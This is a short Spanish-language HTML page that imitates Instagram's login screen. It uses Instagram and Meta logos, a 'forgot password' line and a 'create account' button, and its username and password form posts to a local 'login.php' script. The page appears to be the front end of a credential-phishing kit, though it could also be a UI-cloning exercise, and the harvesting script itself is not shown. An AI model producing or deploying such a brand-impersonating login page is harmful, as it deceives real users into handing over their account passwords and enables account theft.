<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/png" href="insta-logo.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <div class="language-selector">
            Español ▾
        </div>

        <div class="content">
            <img src="insta-logo.png" alt="insta" class="mi-logo-principal">
            
            
            <form action="login.php" method="POST" class="login-form">
                <input type="text" name="email" placeholder="Nombre de usuario, correo o celular" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                
                <button type="submit" class="btn-submit">Iniciar sesión</button>
            </form>

            <div class="forgot-link">
                ¿Olvidaste tu contraseña?
            </div>



            <button class="fb-login">
                Crear cuenta nueva 
                
            </button>
            <img src="meta-logo.png" alt="meta" class="mi-logo-secundario">
        </div>

        <div class="footer">
            
        </div>
    </div>

</body>
</html>
